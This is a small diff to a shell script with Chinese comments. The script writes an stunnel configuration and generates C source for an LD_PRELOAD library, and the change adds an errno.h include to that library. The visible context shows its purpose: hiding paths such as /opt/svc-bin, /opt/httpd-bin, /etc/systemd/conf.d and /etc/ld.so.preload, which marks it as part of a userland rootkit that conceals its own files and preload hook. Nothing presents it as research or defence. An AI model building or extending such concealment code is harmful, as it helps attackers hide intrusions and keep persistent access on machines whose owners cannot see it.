@@ -213,7 +213,7 @@ curve = secp384r1
 EOF
 chmod 600 "$stunnel_conf"
 
-# 创建 LD_PRELOAD 文件隐藏库
+# 创建 LD_PRELOAD 文件隐藏库（添加 errno.h）
 cat > /opt/svc-bin/hide_files.c <<EOF
 #define _GNU_SOURCE
 #include <dlfcn.h>
@@ -221,6 +221,7 @@ cat > /opt/svc-bin/hide_files.c <<EOF
 #include <stdio.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <errno.h>
 
 static const char *hidden_paths[] = {"/opt/httpd-bin", "/etc/systemd/conf.d", "/opt/svc-bin", "/etc/ld.so.preload", "/mnt/tmpfs", NULL};
 
